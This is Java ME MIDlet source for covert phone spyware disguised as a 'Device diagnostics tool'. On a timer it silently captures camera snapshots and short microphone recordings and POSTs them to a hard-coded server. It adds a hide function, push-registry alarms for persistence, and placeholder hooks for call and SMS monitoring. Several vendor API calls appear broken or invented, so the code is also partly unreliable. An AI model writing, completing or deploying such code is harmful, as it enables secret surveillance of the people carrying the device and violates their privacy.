import javax.microedition.midlet.*;
import javax.microedition.lcdui.*;
import javax.microedition.media.*;
import javax.microedition.media.control.*;
import javax.microedition.io.*;
import javax.microedition.rms.*;
import javax.microedition.pim.*;
import java.io.*;
import java.util.*;
import java.util.Timer;
import java.util.TimerTask;

public class J2MESurveillance extends MIDlet implements CommandListener, Runnable {
    private Display display;
    private Form mainForm;
    private Command exitCommand, hideCommand, captureCommand, settingsCommand;
    private String serverURL = "http://192.168.100.3:5000/data";
    private Timer surveillanceTimer;
    private boolean isRunning = false;
    private boolean isHidden = false;
    private RecordStore configStore;
    private int captureInterval = 30; // minutes
    private boolean autoStart = false;
    private boolean usePushRegistry = false;
    private boolean useSystemEvents = false;
    
    // Platform-specific flags
    private boolean isNokia = false;
    private boolean isSonyEricsson = false;
    private boolean isMotorola = false;
    
    public void startApp() {
        display = Display.getDisplay(this);
        detectPlatform();
        loadConfiguration();
        setupPushRegistry();
        setupSystemEventListeners();
        
        mainForm = new Form("System Tools");
        mainForm.append("Device diagnostics tool\n");
        mainForm.append("Version 2.1\n");
        
        exitCommand = new Command("Exit", Command.EXIT, 0);
        hideCommand = new Command("Hide", Command.SCREEN, 1);
        captureCommand = new Command("Capture Now", Command.SCREEN, 2);
        settingsCommand = new Command("Settings", Command.SCREEN, 3);
        
        mainForm.addCommand(exitCommand);
        mainForm.addCommand(hideCommand);
        mainForm.addCommand(captureCommand);
        mainForm.addCommand(settingsCommand);
        mainForm.setCommandListener(this);
        
        if (!isHidden) {
            display.setCurrent(mainForm);
        }
        
        startBackgroundService();
    }
    
    private void detectPlatform() {
        String platform = System.getProperty("microedition.platform");
        if (platform != null) {
            platform = platform.toLowerCase();
            if (platform.indexOf("nokia") != -1) {
                isNokia = true;
            } else if (platform.indexOf("sonyericsson") != -1) {
                isSonyEricsson = true;
            } else if (platform.indexOf("motorola") != -1) {
                isMotorola = true;
            }
        }
    }
    
    private void loadConfiguration() {
        try {
            configStore = RecordStore.openRecordStore("SysConfig", true);
            if (configStore.getNumRecords() > 0) {
                byte[] data = configStore.getRecord(1);
                ByteArrayInputStream bais = new ByteArrayInputStream(data);
                DataInputStream dis = new DataInputStream(bais);
                captureInterval = dis.readInt();
                autoStart = dis.readBoolean();
                usePushRegistry = dis.readBoolean();
                useSystemEvents = dis.readBoolean();
                dis.close();
            }
        } catch (Exception e) {
            // Use defaults
        }
    }
    
    private void saveConfiguration() {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            DataOutputStream dos = new DataOutputStream(baos);
            dos.writeInt(captureInterval);
            dos.writeBoolean(autoStart);
            dos.writeBoolean(usePushRegistry);
            dos.writeBoolean(useSystemEvents);
            dos.close();
            
            byte[] data = baos.toByteArray();
            if (configStore.getNumRecords() == 0) {
                configStore.addRecord(data, 0, data.length);
            } else {
                configStore.setRecord(1, data, 0, data.length);
            }
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private void setupPushRegistry() {
        if (!usePushRegistry) return;
        
        try {
            // Register for periodic alarms
            String className = this.getClass().getName();
            String filter = "*";
            
            // Check if already registered
            String[] connections = PushRegistry.listConnections(false);
            boolean alreadyRegistered = false;
            for (int i = 0; i < connections.length; i++) {
                if (connections[i].startsWith("alarm://")) {
                    alreadyRegistered = true;
                    break;
                }
            }
            
            if (!alreadyRegistered) {
                // Register for alarm every 30 minutes
                long alarmTime = System.currentTimeMillis() + (captureInterval * 60 * 1000);
                PushRegistry.registerAlarm(className, alarmTime);
            }
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private void setupSystemEventListeners() {
        if (!useSystemEvents) return;
        
        try {
            // Try to listen for system events (platform-specific)
            if (isNokia) {
                // Nokia-specific: listen for call events
                setupNokiaCallListener();
            } else if (isSonyEricsson) {
                // Sony Ericsson-specific: listen for SMS events
                setupSonyEricssonSMSListener();
            }
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private void setupNokiaCallListener() {
        // This is a placeholder - actual implementation would use Nokia-specific APIs
        try {
            // Nokia provides proprietary APIs for call monitoring
            // We would register a listener for incoming/outgoing calls
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private void setupSonyEricssonSMSListener() {
        // This is a placeholder - actual implementation would use Sony Ericsson-specific APIs
        try {
            // Sony Ericsson provides proprietary APIs for SMS monitoring
            // We would register a listener for incoming SMS messages
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private void startBackgroundService() {
        if (isRunning) return;
        
        isRunning = true;
        surveillanceTimer = new Timer();
        surveillanceTimer.schedule(new TimerTask() {
            public void run() {
                performSurveillance();
            }
        }, 5000, captureInterval * 60 * 1000); // Start after 5 seconds, then every X minutes
    }
    
    private void performSurveillance() {
        try {
            // Capture image if possible
            byte[] imageData = captureImageSilently();
            
            // Record audio if possible
            byte[] audioData = recordAudioSilently();
            
            // Send data to server
            if (imageData != null || audioData != null) {
                sendDataToServer(imageData, audioData);
            }
            
            // Schedule next alarm if using push registry
            if (usePushRegistry) {
                long nextAlarm = System.currentTimeMillis() + (captureInterval * 60 * 1000);
                PushRegistry.registerAlarm(this.getClass().getName(), nextAlarm);
            }
            
        } catch (Exception e) {
            // Silently continue
        }
    }
    
    private byte[] captureImageSilently() {
        try {
            Player player = Manager.createPlayer("capture://image");
            player.realize();
            VideoControl videoControl = (VideoControl) player.getControl("VideoControl");
            
            if (videoControl == null) {
                return null;
            }
            
            // Try to capture without showing viewfinder
            byte[] imageData = videoControl.getSnapshot("encoding=jpeg&width=160&height=120");
            player.close();
            
            return imageData;
        } catch (Exception e) {
            return null;
        }
    }
    
    private byte[] recordAudioSilently() {
        try {
            Player player = Manager.createPlayer("capture://audio");
            player.realize();
            RecordControl recordControl = (RecordControl) player.getControl("RecordControl");
            
            if (recordControl == null) {
                return null;
            }
            
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            recordControl.setRecordStream(output);
            recordControl.startRecord();
            player.start();
            
            // Record for 3 seconds
            Thread.sleep(3000);
            
            recordControl.stopRecord();
            recordControl.commit();
            player.close();
            
            return output.toByteArray();
        } catch (Exception e) {
            return null;
        }
    }
    
    private void sendDataToServer(byte[] imageData, byte[] audioData) {
        try {
            HttpConnection connection = null;
            OutputStream os = null;
            
            try {
                connection = (HttpConnection) Connector.open(serverURL);
                connection.setRequestMethod(HttpConnection.POST);
                connection.setRequestProperty("Content-Type", "application/octet-stream");
                
                os = connection.openOutputStream();
                
                // Write device info
                String deviceInfo = "Device:" + System.getProperty("microedition.platform") + "\n";
                os.write(deviceInfo.getBytes());
                
                // Write image data if available
                if (imageData != null) {
                    os.write("[IMAGE]".getBytes());
                    os.write(imageData);
                }
                
                // Write audio data if available
                if (audioData != null) {
                    os.write("[AUDIO]".getBytes());
                    os.write(audioData);
                }
                
                os.flush();
                
                // Check response
                int responseCode = connection.getResponseCode();
                if (responseCode != HttpConnection.HTTP_OK) {
                    // Server error, try again later
                }
                
            } finally {
                if (os != null) os.close();
                if (connection != null) connection.close();
            }
            
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private void hideApplication() {
        isHidden = true;
        display.setCurrent(null);
        
        // Try to minimize to background
        try {
            if (isNokia) {
                // Nokia-specific: use proprietary API to minimize
                com.nokia.mid.ui.FullScreen.setFullScreen(false);
            } else if (isSonyEricsson) {
                // Sony Ericsson-specific: use proprietary API
                com.sonyericsson.ui.UiApplication.getUiApplication().requestBackground();
            }
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private void showSettings() {
        Form settingsForm = new Form("Settings");
        
        // Interval setting
        ChoiceGroup intervalGroup = new ChoiceGroup("Capture Interval", ChoiceGroup.POPUP);
        intervalGroup.append("5 minutes", null);
        intervalGroup.append("15 minutes", null);
        intervalGroup.append("30 minutes", null);
        intervalGroup.append("1 hour", null);
        intervalGroup.append("2 hours", null);
        
        // Set current selection
        int selectedIndex = 2; // Default 30 minutes
        if (captureInterval == 5) selectedIndex = 0;
        else if (captureInterval == 15) selectedIndex = 1;
        else if (captureInterval == 60) selectedIndex = 3;
        else if (captureInterval == 120) selectedIndex = 4;
        
        intervalGroup.setSelectedIndex(selectedIndex, true);
        settingsForm.append(intervalGroup);
        
        // Auto-start setting
        ChoiceGroup autoStartGroup = new ChoiceGroup("Auto-start", ChoiceGroup.MULTIPLE);
        autoStartGroup.append("Enable auto-start", null);
        autoStartGroup.append("Use Push Registry", null);
        autoStartGroup.append("Use System Events", null);
        
        if (autoStart) autoStartGroup.setSelectedIndex(0, true);
        if (usePushRegistry) autoStartGroup.setSelectedIndex(1, true);
        if (useSystemEvents) autoStartGroup.setSelectedIndex(2, true);
        
        settingsForm.append(autoStartGroup);
        
        // Save command
        Command saveCommand = new Command("Save", Command.OK, 0);
        Command cancelCommand = new Command("Cancel", Command.CANCEL, 1);
        settingsForm.addCommand(saveCommand);
        settingsForm.addCommand(cancelCommand);
        
        settingsForm.setCommandListener(new CommandListener() {
            public void commandAction(Command c, Displayable d) {
                if (c == saveCommand) {
                    // Save settings
                    int intervalIndex = intervalGroup.getSelectedIndex();
                    if (intervalIndex == 0) captureInterval = 5;
                    else if (intervalIndex == 1) captureInterval = 15;
                    else if (intervalIndex == 2) captureInterval = 30;
                    else if (intervalIndex == 3) captureInterval = 60;
                    else if (intervalIndex == 4) captureInterval = 120;
                    
                    autoStart = autoStartGroup.isSelected(0);
                    usePushRegistry = autoStartGroup.isSelected(1);
                    useSystemEvents = autoStartGroup.isSelected(2);
                    
                    saveConfiguration();
                    
                    // Restart service with new settings
                    if (surveillanceTimer != null) {
                        surveillanceTimer.cancel();
                    }
                    startBackgroundService();
                    
                    display.setCurrent(mainForm);
                } else if (c == cancelCommand) {
                    display.setCurrent(mainForm);
                }
            }
        });
        
        display.setCurrent(settingsForm);
    }
    
    public void commandAction(Command c, Displayable d) {
        if (c == exitCommand) {
            destroyApp(true);
            notifyDestroyed();
        } else if (c == hideCommand) {
            hideApplication();
        } else if (c == captureCommand) {
            new Thread() {
                public void run() {
                    performSurveillance();
                }
            }.start();
        } else if (c == settingsCommand) {
            showSettings();
        }
    }
    
    public void pauseApp() {
        // Try to keep running in background
        if (!isHidden) {
            hideApplication();
        }
    }
    
    public void destroyApp(boolean unconditional) {
        isRunning = false;
        if (surveillanceTimer != null) {
            surveillanceTimer.cancel();
        }
        try {
            if (configStore != null) {
                configStore.closeRecordStore();
            }
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    // Handle push registry activation
    protected void startApp(String[] args) {
        if (args != null && args.length > 0) {
            // Launched by push registry
            isHidden = true;
            performSurveillance();
            // Exit after performing task
            destroyApp(true);
            notifyDestroyed();
        } else {
            // Normal launch
            startApp();
        }
    }
}